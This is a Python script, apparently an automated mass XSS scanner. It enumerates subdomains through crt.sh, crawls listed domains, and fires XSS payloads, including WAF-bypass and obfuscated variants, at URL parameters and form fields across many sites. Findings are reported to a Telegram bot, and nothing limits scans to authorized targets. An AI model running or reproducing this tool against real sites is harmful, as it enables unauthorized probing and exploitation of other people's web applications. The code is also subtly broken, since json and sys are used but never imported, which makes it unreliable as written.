import requests
import re
import urllib.parse
import threading
import queue
from bs4 import BeautifulSoup
import concurrent.futures
import time

TELEGRAM_BOT_TOKEN = "your_telegram_bot_token_here"
TELEGRAM_CHAT_ID = "your_chat_id_here"
NORMAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "\"><details open ontoggle=alert(1)>",
    "';!--\"<XSS>=&{()}",
    "javascript:alert(1)",
    "<scr<script>ipt>alert('XSS')</script>",
    "<svg onload='jav'+'ascript:alert(1)'></svg>",
    "<svg/onload=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)>",
    "<script>/*<script>*/alert(1)//</script>",
    "<script>eval('al'+'ert(1)');</script>",
    "<img onerror=eval('al&#x5c;u0065rt(1)') src=a>"
]
WAF_BYPASS_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src='x' onerror=eval('al'+'ert(1)')>",
]

CRAWL_LIMIT = 100
TIMEOUT = 6
THREADS = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS Auditor Pro v3)"
}

visited_links = set()
lock = threading.Lock()
results = []
RESULT_JSON = "results.json"
RESULT_CSV = "results.csv"


def send_telegram_alert(vuln_type, vulnerable_url):
    domain = urllib.parse.urlparse(vulnerable_url).netloc
    message = (
        "🚨 *XSS Vulnerability Detected!*\n\n"
        f"*Domain:* `{domain}`\n"
        f"*Vulnerability Type:* {vuln_type}\n"
        f"*Vulnerable URL:* [Click here]({vulnerable_url})\n\n"
        "#XSS #SecurityTest"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, data=data, timeout=TIMEOUT)
    except Exception as e:
        print(f"[!] Telegram send error: {e}")


def discover_subdomains(domain):
    subdomains = set()
    try:
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        res = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        matches = re.findall(r'"common_name":"(.*?)"', res.text)
        for match in matches:
            if domain in match:
                subdomains.add("https://" + match.strip())
    except Exception as e:
        print(f"[!] Subdomain discovery failed: {e}")
    return list(subdomains)


def extract_links(url):
    links = []
    try:
        res = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        for tag in soup.find_all("a", href=True):
            link = urllib.parse.urljoin(url, tag['href'])
            if url.split('/')[2] in link:
                links.append(link)
    except Exception:
        pass
    return links


def extract_forms(url):
    try:
        res = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []


def save_results():
    try:
        with open(RESULT_JSON, "w") as jf:
            json.dump(results, jf, indent=4)
        print(f"\n[+] Results saved to {RESULT_JSON}")
    except Exception as e:
        print(f"[!] Saving results failed: {e}")

def test_url_param(url, payload_list, retry=False):
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        for param in params:
            temp_params = params.copy()
            for payload in payload_list:
                temp_params[param] = payload
                new_query = urllib.parse.urlencode(temp_params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                res = requests.get(new_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                if payload in res.text:
                    print(f"[+] Reflected XSS Found: {new_url}")
                    results.append({
                        "domain": parsed.netloc,
                        "vuln_type": "Reflected XSS",
                        "vulnerable_url": new_url
                    })
                    send_telegram_alert("Reflected XSS", new_url)
                elif res.status_code in [403, 406] and not retry:
                    print(f"[*] Normal payload blocked, retrying with WAF Bypass...")
                    test_url_param(url, WAF_BYPASS_PAYLOADS, retry=True)
    except Exception:
        pass


def submit_form(form, url, payload_list, retry=False):
    try:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")

        for payload in payload_list:
            data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    data[name] = payload

            target_url = urllib.parse.urljoin(url, action)

            if method == "post":
                res = requests.post(target_url, data=data, headers=HEADERS, timeout=TIMEOUT, verify=False)
            else:
                res = requests.get(target_url, params=data, headers=HEADERS, timeout=TIMEOUT, verify=False)

            if payload in res.text:
                parsed = urllib.parse.urlparse(target_url)
                print(f"[+] Form XSS Found: {target_url}")
                results.append({
                    "domain": parsed.netloc,
                    "vuln_type": "Form XSS",
                    "vulnerable_url": target_url
                })
                send_telegram_alert("Form XSS", target_url)
            elif res.status_code in [403, 406] and not retry:
                print(f"[*] Form blocked, retrying with WAF bypass...")
                submit_form(form, url, WAF_BYPASS_PAYLOADS, retry=True)
    except Exception:
        pass


def crawl_and_test(start_url):
    q = queue.Queue()
    q.put(start_url)

    total = 0

    while not q.empty() and total < CRAWL_LIMIT:
        url = q.get()
        with lock:
            if url in visited_links:
                continue
            visited_links.add(url)

        links = extract_links(url)
        for link in links:
            q.put(link)

        crawl_progress = (len(visited_links) / CRAWL_LIMIT) * 100
        sys.stdout.write(f"\r[+] Crawling Progress: {crawl_progress:.2f}%")
        sys.stdout.flush()

        for payload in NORMAL_PAYLOADS:
            test_url_param(url, [payload])
            forms = extract_forms(url)
            for form in forms:
                submit_form(form, url, [payload])

        total += 1
    print()


def process_domain(domain):
    targets = [domain]
    subdomains = discover_subdomains(domain.replace("https://", "").replace("http://", ""))
    targets.extend(subdomains)

    print(f"[*] Found {len(subdomains)} subdomains for {domain}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(crawl_and_test, targets)


def main():
    domain_file = "domains.txt"
    try:
        with open(domain_file, "r") as f:
            domains = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read domains.txt: {e}")
        return

    for domain in domains:
        if not domain.startswith("http"):
            domain = "https://" + domain
        print(f"[*] Starting scan for {domain}")
        process_domain(domain)

    save_results()


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
